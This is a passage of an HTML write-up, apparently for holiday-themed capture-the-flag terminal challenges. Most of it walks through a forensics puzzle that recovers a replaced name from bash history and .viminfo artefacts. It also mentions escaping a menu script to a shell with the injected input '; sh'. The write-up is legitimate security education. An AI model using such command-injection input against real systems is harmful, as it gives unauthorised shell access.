<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW </span>
<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO</span> <span style="color: rgb(211, 215, 207);"> ,MMMM. .MMMMMMM, </span>.<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMW </span>
<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMc ...  cWMWl.  ..</span> <span style="color: rgb(211, 215, 207);">.NMk.  ..  .oMMMMM. .MMMMMMM, </span>.<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMW </span>
<span style="color: rgb(211, 215, 207);"> </span>xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK<span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(78, 154, 6);">oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,</span><span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span> .<span style="color: rgb(78, 154, 6);">looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,</span> <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);">   </span> .<span style="color: rgb(78, 154, 6);">,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;</span>. <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">                                                                                </span>

Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...:</pre>
        <p>It's possible to escape to a shell using the input "; sh" to open a command line shell. There you can take a look at <a href="#artMenuPS1">menu.ps1</a>, the powershell script that is your opening menu. As a matter of fact there are a few different options for exploiting this powershell script.</p>
      </div>

      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termViminfo"></a>Lethal ForensicELFication
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntTangle">Tangle Coalbox Hints</a>
            <a class="dropdown-item" href="#npcTangle">Tangle Coalbox</a>
            <a class="dropdown-item" href="#obj3">Objective 3</a>
          </div>
        </div>
        <div id="divViminfo" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT12aW1pbmZvIj48L2lmcmFtZT48cD48YSBocmVmPSIjISIgY2xhc3M9ImJ0biBidG4taW5mbyIgIG9ubW91c2V1cD0iJCgnI2RpdlZpbWluZm8nKS5odG1sKGF0b2IoJ1BHRWdhSEpsWmowaUl5RWlJR05zWVhOelBTSmlkRzRnWW5SdUxXbHVabThpUGtOc2FXTnJJR2hsY21VZ2RHOGdQR0krYjNCbGJqd3ZZajRnVEdWMGFHRnNJRVp2Y21WdWMybGpSVXhHYVdOaGRHbHZiaUJVWlhKdGFXNWhiRHd2WVQ0PScpKSI+Q2xpY2sgaGVyZSB0byA8Yj5jbG9zZTwvYj4gTGV0aGFsIEZvcmVuc2ljRUxGaWNhdGlvbiBUZXJtaW5hbDwvYT48L3A+"))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Lethal ForensicELFication Terminal</a>
        </div>
        <hr class="my-4">
        <p>On initial login we're given a rhyme that asks for the first name of the elf of whom a love poem was written. The elf associated with this puzzle is <a href="#npcTangle">Tangle Coalbox</a></p>
<pre class="text-monospace bg-dark text-light p-2">
<span style="color: rgb(211, 215, 207);">  </span>  <span style="color: rgb(211, 215, 207);">       </span> <span style="color: rgb(211, 215, 207);">          </span> <span style="color: rgb(211, 215, 207);">....</span>.<span style="color: rgb(211, 215, 207);">.......'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">        </span> <span style="color: rgb(211, 215, 207);">           ....</span>.<span style="color: rgb(211, 215, 207);">.......'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM</span>
<span style="color: rgb(211, 215, 207);">   </span><span style="color: rgb(204, 0, 0);">.,.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">,.</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">......</span><span style="color: rgb(204, 0, 0);">.,</span><span style="color: rgb(211, 215, 207);">.  </span>.<span style="color: rgb(204, 0, 0);">',</span><span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(78, 154, 6);">.'',,</span>.<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">:::::</span><span style="color: rgb(211, 215, 207);">,,</span>;<span style="color: rgb(78, 154, 6);">:c:</span><span style="color: rgb(211, 215, 207);">::c</span>c<span style="color: rgb(78, 154, 6);">oo</span>oo<span style="color: rgb(211, 215, 207);">odx</span><span style="color: rgb(204, 0, 0);">kk</span><span style="color: rgb(211, 215, 207);">OOk</span>OO0KKXXX<span style="color: rgb(211, 215, 207);">NNWMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(204, 0, 0);">ldd:</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.d'</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">';...</span> <span style="color: rgb(204, 0, 0);">.o:</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(204, 0, 0);">.d;</span><span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(78, 154, 6);">;:...</span>.<span style="color: rgb(211, 215, 207);">'</span><span style="color: rgb(204, 0, 0);">dl</span><span style="color: rgb(211, 215, 207);">,</span><span style="color: rgb(204, 0, 0);">;do</span><span style="color: rgb(211, 215, 207);">,</span><span style="color: rgb(78, 154, 6);">:lloc</span>:c<span style="color: rgb(78, 154, 6);">oddd</span><span style="color: rgb(211, 215, 207);">od</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(211, 215, 207);">xxk</span><span style="color: rgb(204, 0, 0);">0K</span><span style="color: rgb(211, 215, 207);">O</span>O<span style="color: rgb(78, 154, 6);">KK</span>KKXNN<span style="color: rgb(211, 215, 207);">NWMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(204, 0, 0);">lo.ol.d'</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">';'..</span>  <span style="color: rgb(204, 0, 0);">,d'</span><span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">lc</span><span style="color: rgb(211, 215, 207);">..</span><span style="color: rgb(78, 154, 6);">;:,,,</span><span style="color: rgb(211, 215, 207);">.'</span><span style="color: rgb(204, 0, 0);">docod:</span>,<span style="color: rgb(78, 154, 6);">:l:lo</span>c<span style="color: rgb(78, 154, 6);">ld</span>l<span style="color: rgb(78, 154, 6);">dd</span>o<span style="color: rgb(204, 0, 0);">kO</span><span style="color: rgb(211, 215, 207);">xdxxO</span><span style="color: rgb(204, 0, 0);">K</span><span style="color: rgb(211, 215, 207);">0</span>O<span style="color: rgb(78, 154, 6);">KK</span>KXXXN<span style="color: rgb(211, 215, 207);">NWMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(204, 0, 0);">lo</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);"> lod'</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">'; </span>   <span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(204, 0, 0);">co:o</span><span style="color: rgb(211, 215, 207);">.</span>.<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(78, 154, 6);">;:</span>....<span style="color: rgb(211, 215, 207);">'</span><span style="color: rgb(204, 0, 0);">dl</span><span style="color: rgb(211, 215, 207);">'</span><span style="color: rgb(204, 0, 0);">:dl</span><span style="color: rgb(211, 215, 207);">,</span><span style="color: rgb(78, 154, 6);">:l:</span>:<span style="color: rgb(78, 154, 6);">oodl</span><span style="color: rgb(211, 215, 207);">c</span><span style="color: rgb(78, 154, 6);">dd</span>o<span style="color: rgb(204, 0, 0);">xOk</span><span style="color: rgb(211, 215, 207);">xxk</span><span style="color: rgb(204, 0, 0);">0K</span><span style="color: rgb(211, 215, 207);">O</span>O<span style="color: rgb(78, 154, 6);">K</span>KKKXNN<span style="color: rgb(211, 215, 207);">NWMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(204, 0, 0);">,,</span><span style="color: rgb(211, 215, 207);">   </span><span style="color: rgb(204, 0, 0);">,;.</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">......</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">;:.</span>.<span style="color: rgb(211, 215, 207);">.</span>.<span style="color: rgb(78, 154, 6);">',,,,'</span><span style="color: rgb(211, 215, 207);">'</span><span style="color: rgb(204, 0, 0);">c:</span><span style="color: rgb(211, 215, 207);">''</span><span style="color: rgb(204, 0, 0);">:l</span><span style="color: rgb(211, 215, 207);">;</span>;<span style="color: rgb(78, 154, 6);">c</span>:;:<span style="color: rgb(78, 154, 6);">ll</span>cc<span style="color: rgb(78, 154, 6);">oo</span><span style="color: rgb(211, 215, 207);">o</span>o<span style="color: rgb(211, 215, 207);">d</span><span style="color: rgb(204, 0, 0);">kkOO</span><span style="color: rgb(211, 215, 207);">Ok</span>OO0K<span style="color: rgb(211, 215, 207);">K</span>KXNN<span style="color: rgb(211, 215, 207);">NWMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">        </span> <span style="color: rgb(211, 215, 207);">           ....</span>.<span style="color: rgb(211, 215, 207);">.......'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM</span>
<span style="color: rgb(211, 215, 207);">  </span>  <span style="color: rgb(211, 215, 207);">       </span> <span style="color: rgb(211, 215, 207);">          </span> <span style="color: rgb(211, 215, 207);">....</span>.<span style="color: rgb(211, 215, 207);">.......'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM</span>

Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem
  was written.  Complete this challenge by submitting
  that name to runtoanswer.
elf@776172646f67:~$</pre>

        <p>We do see some interesting bash history from this terminal</p>

<pre class="text-monospace bg-dark text-light p-2">
set -o history
whoami
echo "No, really...  /-:"
mkdir -p .secrets/her/
firefox https://www.google.com/search?q=love+poetry
vim
ls -lAR
exit
set -o history
df -h
who
firefox https://www.google.com/search?q=replacing+strings+in+vim
time vim
ls -lAR
exit
set -o history
vim
exit

ls -lA
cat .bash_history
echo "" >> .bash_history
firefox https://www.google.com/search?q=turn+off+bash+history
set +o history
set +o history</pre>
        <p>First there's a secret directory <code>.secrets/her</code>. We also see the user trying to fire up firefox to go to <code>https://www.google.com/search?q=replacing+strings+in+vim</code>, a Google search for "replacing strings in vim". The last piece of interesting history is a google search for "turn off bash history".</p>
        <p>One of <a href="#hntTangle">Tangle Coalbox's hints</a> is <a href="https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/">a TM4n6 blog post about the "Forensic Relevance of Vim Artifacts"</a> which references a vim artefact called <code>.viminfo</code>. Taking a look at the home directory, we can see this file does exist.</p>

<pre class="text-monospace bg-dark text-light p-2">
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
<span style="color: rgb(255, 64, 64);">-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo</span>
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer</pre>

        <p>Opening <code>.viminfo</code> with vi does reveal a few interesting artefacts:</p>

<pre class="text-monospace bg-dark text-light p-2">
<span style="color: rgb(52, 101, 164);"># This viminfo file was generated by Vim 8.0.</span>
<span style="color: rgb(52, 101, 164);"># You may edit it if you're careful!</span>

<span style="color: rgb(52, 101, 164);"># Viminfo version</span>
<span style="color: rgb(204, 0, 0);">|1,4</span>

<span style="color: rgb(52, 101, 164);"># Value of 'encoding' when this file was written</span>
*encoding=latin1


<span style="color: rgb(52, 101, 164);"># hlsearch on (H) or off (h):</span>
<span style="color: rgb(196, 160, 0);">~h</span>
<span style="color: rgb(52, 101, 164);"># Last Substitute Search Pattern:</span>
<span style="color: rgb(196, 160, 0);">~MSle0~&amp;</span>Elinore

<span style="color: rgb(52, 101, 164);"># Last Substitute String:</span>
<span style="color: rgb(196, 160, 0);">$</span>NEVERMORE

<span style="color: rgb(52, 101, 164);"># Command Line History (newest to oldest):</span>
<span style="color: rgb(196, 160, 0);">:</span>q
<span style="color: rgb(204, 0, 0);">|2,0,1547388653,,"q"</span>
<span style="color: rgb(196, 160, 0);">:</span>wq
<span style="color: rgb(204, 0, 0);">|2,0,1536607231,,"wq"</span>
<span style="color: rgb(196, 160, 0);">:</span>%s/Elinore/NEVERMORE/g
<span style="color: rgb(204, 0, 0);">|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"</span>
<span style="color: rgb(196, 160, 0);">:</span>r .secrets/her/poem.txt
<span style="color: rgb(204, 0, 0);">|2,0,1536600314,,"r .secrets/her/poem.txt"</span>
<span style="color: rgb(196, 160, 0);">:</span>w
<span style="color: rgb(204, 0, 0);">|2,0,1536606841,,"w"</span>
<span style="color: rgb(196, 160, 0);">:</span>s/God/fates/gc
<span style="color: rgb(204, 0, 0);">|2,0,1536606833,,"s/God/fates/gc"</span>
<span style="color: rgb(196, 160, 0);">:</span>%s/studied/looking/g
<span style="color: rgb(204, 0, 0);">|2,0,1536602549,,"%s/studied/looking/g"</span>
<span style="color: rgb(196, 160, 0);">:</span>%s/sound/tenor/g
<span style="color: rgb(204, 0, 0);">|2,0,1536600579,,"%s/sound/tenor/g"</span>

<span style="color: rgb(52, 101, 164);"># Search String History (newest to oldest):</span>
<span style="color: rgb(196, 160, 0);">?</span> Elinore
<span style="color: rgb(204, 0, 0);">|2,1,1536607217,,"Elinore"</span>
<span style="color: rgb(196, 160, 0);">?</span> God
<span style="color: rgb(204, 0, 0);">|2,1,1536606833,,"God"</span>
<span style="color: rgb(196, 160, 0);">?</span> rousted
<span style="color: rgb(204, 0, 0);">|2,1,1536605996,,"rousted"</span>
<span style="color: rgb(196, 160, 0);">?</span> While
<span style="color: rgb(204, 0, 0);">|2,1,1536604909,,"While"</span>
<span style="color: rgb(196, 160, 0);">?</span> studied
<span style="color: rgb(204, 0, 0);">|2,1,1536602549,,"studied"</span>
<span style="color: rgb(196, 160, 0);">?</span> sound
<span style="color: rgb(204, 0, 0);">|2,1,1536600579,,"sound"</span>
".viminfo" 274L, 7441C                                                    23,21         Top</pre>

        <p>The lines of interest are:</p>

<pre class="text-monospace bg-dark text-light p-2">
<span style="color: rgb(52, 101, 164);"># Last Substitute Search Pattern:</span>
<span style="color: rgb(196, 160, 0);">~MSle0~&amp;</span>Elinore</pre>

<pre class="text-monospace bg-dark text-light p-2">
<span style="color: rgb(196, 160, 0);">:</span>%s/Elinore/NEVERMORE/g</pre>

        <p>These suggest the name 'Elinore' was replaced with the term 'NEVERMORE'. The colon mode command of <code>%s/Elinore/NEVERMORE/g</code> can be broken down as:</p>
        <ul>
          <li><kbd>%</kbd> - Perform this command on every line of the document</li>
          <li><kbd>s</kbd> - Perform a substitution</li>
          <li><kbd>/</kbd> - The slashes separate the different inputs of the substitution command</li>
          <ul>
            <li><kbd>Elinore</kbd> - The term to search for</li>
            <li><kbd>NEVERMORE</kbd> - The string to replace the search term with</li>
          </ul>
          <li><kbd>g</kbd> - This means "globally" or "all occurances". Without this the replacement would only apply to the first search hit from your current location in the file.
        </ul>

        <p>Finally with our answer "Elinore" in hand we can run <code>runtoanswer</code>.</p>

<pre class="text-monospace bg-dark text-light p-2">
elf@776172646f67:~$ runtoanswer
Loading, please wait......



Who was the poem written about? Elinore


<span style="color: rgb(211, 215, 207);">WWNXXK00OOkkxddoolllcc::;;;,,,'''........</span>.<span style="color: rgb(211, 215, 207);">....         </span> <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">            </span>  <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNXXK00OOkkxddoolllcc::;;;,,,'''........</span>.<span style="color: rgb(211, 215, 207);">....         </span> <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">            </span>  <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>XK<span style="color: rgb(211, 215, 207);">00</span>OOkkx<span style="color: rgb(211, 215, 207);">ddoolllcc</span>:<span style="color: rgb(211, 215, 207);">:</span>;;<span style="color: rgb(211, 215, 207);">;</span>,<span style="color: rgb(211, 215, 207);">,,'</span>'<span style="color: rgb(211, 215, 207);">'..</span>...<span style="color: rgb(211, 215, 207);">...</span>.<span style="color: rgb(211, 215, 207);">.</span>...<span style="color: rgb(211, 215, 207);">           </span> <span style="color: rgb(211, 215, 207);">       </span> <span style="color: rgb(211, 215, 207);">  </span>     <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">KK00OOOxd</span>dddo<span style="color: rgb(211, 215, 207);">llccc</span><span style="color: rgb(204, 0, 0);">ll</span><span style="color: rgb(211, 215, 207);">:</span>;,;:;,'<span style="color: rgb(211, 215, 207);">..</span>.,,.<span style="color: rgb(211, 215, 207);">....</span><span style="color: rgb(204, 0, 0);">'',,''.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);"> </span> .<span style="color: rgb(78, 154, 6);">.....</span>.   <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.''''''</span><span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">XKK0OOkxd</span>xxxo<span style="color: rgb(211, 215, 207);">llccc</span><span style="color: rgb(204, 0, 0);">oo</span><span style="color: rgb(211, 215, 207);">:;</span>,ccc<span style="color: rgb(78, 154, 6);">:</span>;.<span style="color: rgb(211, 215, 207);">.</span>.<span style="color: rgb(78, 154, 6);">:;</span>.<span style="color: rgb(211, 215, 207);">..</span><span style="color: rgb(204, 0, 0);">,:;'...,:;.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">,,.</span>..<span style="color: rgb(78, 154, 6);">.,,</span>.<span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(204, 0, 0);">::'....</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">XKK0OOk</span>x<span style="color: rgb(211, 215, 207);">d</span>xxxo<span style="color: rgb(211, 215, 207);">llccc</span><span style="color: rgb(204, 0, 0);">oo</span><span style="color: rgb(211, 215, 207);">:;</span>,c<span style="color: rgb(78, 154, 6);">c</span>;:<span style="color: rgb(78, 154, 6);">:</span>;..<span style="color: rgb(78, 154, 6);">:;</span>..<span style="color: rgb(204, 0, 0);">,::</span><span style="color: rgb(211, 215, 207);">... </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">;:,</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">,,.</span>  .<span style="color: rgb(78, 154, 6);">,,</span>.<span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(204, 0, 0);">::'...</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">XKK0OOk</span>x<span style="color: rgb(211, 215, 207);">d</span>xxxo<span style="color: rgb(211, 215, 207);">llccc</span><span style="color: rgb(204, 0, 0);">oo</span><span style="color: rgb(211, 215, 207);">:;</span>,c<span style="color: rgb(78, 154, 6);">c</span>,';<span style="color: rgb(78, 154, 6);">:</span>;'<span style="color: rgb(78, 154, 6);">:;</span>.<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">,::</span><span style="color: rgb(211, 215, 207);">...   </span><span style="color: rgb(204, 0, 0);">,:;</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">,,,',,'</span>   <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">::,'''.</span> <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">XK0</span>OOkkx<span style="color: rgb(211, 215, 207);">d</span>xxxo<span style="color: rgb(211, 215, 207);">llc</span>c<span style="color: rgb(211, 215, 207);">c</span><span style="color: rgb(204, 0, 0);">oo</span><span style="color: rgb(211, 215, 207);">:;</span>,c<span style="color: rgb(78, 154, 6);">c</span>,<span style="color: rgb(211, 215, 207);">'</span>';<span style="color: rgb(78, 154, 6);">:;:;</span>..<span style="color: rgb(204, 0, 0);">'::'</span><span style="color: rgb(211, 215, 207);">.</span>. <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.;:.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">,,.</span>  <span style="color: rgb(78, 154, 6);">','</span> <span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(204, 0, 0);">::.</span><span style="color: rgb(211, 215, 207);">  </span>  <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">WWNX</span>X<span style="color: rgb(211, 215, 207);">XKK00OOk</span>dxxxddooc<span style="color: rgb(211, 215, 207);">c</span><span style="color: rgb(204, 0, 0);">oo</span><span style="color: rgb(211, 215, 207);">:;</span>,c<span style="color: rgb(78, 154, 6);">c</span>,<span style="color: rgb(211, 215, 207);">''</span>.,<span style="color: rgb(78, 154, 6);">::;</span>..<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">.;:;,,;:,.</span><span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(78, 154, 6);">,,.</span><span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(78, 154, 6);">','</span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">::;;;;; </span> <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">WWNXXKK0OOkkx</span>dddoollcc<span style="color: rgb(211, 215, 207);">:::;;,</span>,,'<span style="color: rgb(211, 215, 207);">''.</span>.....<span style="color: rgb(211, 215, 207);">..</span>..<span style="color: rgb(211, 215, 207);">..... </span>  <span style="color: rgb(211, 215, 207);">  </span>    <span style="color: rgb(211, 215, 207);"> </span>       <span style="color: rgb(211, 215, 207);">       </span>  <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">WWNXXK00OOkkxddoolllcc::;;;,,,'''........</span>.<span style="color: rgb(211, 215, 207);">....         </span> <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">            </span>  <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">WWNXXK00OOkkxddoolllcc::;;;,,,'''........</span>.<span style="color: rgb(211, 215, 207);">....         </span> <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">            </span>  <span style="color: rgb(211, 215, 207);">      </span>

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!</pre>

      </div>

      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termPlaintextCreds"></a>Stall Mucking Report
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntWunorse">Wunorse Openslae Hints</a>
            <a class="dropdown-item" href="#npcWunorse">Wunorse Openslae</a>
            <a class="dropdown-item" href="#obj4">Objective 4</a>
          </div>
        </div>

        <div id="divPlaintextCreds" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1wbGFpbnRleHQtY3JlZHMiPjwvaWZyYW1lPjxwPjxhIGhyZWY9IiMhIiBjbGFzcz0iYnRuIGJ0bi1pbmZvIiAgb25tb3VzZXVwPSIkKCcjZGl2UGxhaW50ZXh0Q3JlZHMnKS5odG1sKGF0b2IoJ1BHRWdhSEpsWmowaUl5RWlJR05zWVhOelBTSmlkRzRnWW5SdUxXbHVabThpUGtOc2FXTnJJR2hsY21VZ2RHOGdQR0krYjNCbGJqd3ZZajRnVTNSaGJHd2dUWFZqYTJsdVp5QlNaWEJ2Y25RZ1ZHVnliV2x1WVd3OEwyRSsnKSkiPkNsaWNrIGhlcmUgdG8gPGI+Y2xvc2U8L2I+IFN0YWxsIE11Y2tpbmcgUmVwb3J0IFRlcm1pbmFsPC9hPjwvcD4="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Stall Mucking Report Terminal</a>
        </div>

        <hr class="my-4">
        <pre class="text-monospace bg-dark text-light p-2">
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">KXXXXXXX</span><span style="color: rgb(204, 0, 0);">kxddo;,,,,,,,,,,,,,,,,,,,,,,,,cddxk</span><span style="color: rgb(196, 160, 0);">XXXXXXX</span><span style="color: rgb(204, 0, 0);">kc,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkk00</span><span style="color: rgb(196, 160, 0);">KXXXXX</span><span style="color: rgb(204, 0, 0);">kl,,,,,,,,,,,,oKOc,,,,,,,,,,,:x</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">0kdc;,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">KXXXK</span><span style="color: rgb(204, 0, 0);">x:,,,,,,,,;dK</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">0l,,,,,,,,cx</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">k,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXX</span><span style="color: rgb(204, 0, 0);">0xoc;,;d</span><span style="color: rgb(196, 160, 0);">KXXXXXXXX</span><span style="color: rgb(204, 0, 0);">0l;:cokK</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">Ko,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">Kkl,,,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkOO00</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">xc:;,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkO0</span><span style="color: rgb(196, 160, 0);">XNWWNNXXXXXXXXXXNNWWN</span><span style="color: rgb(204, 0, 0);">0o,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
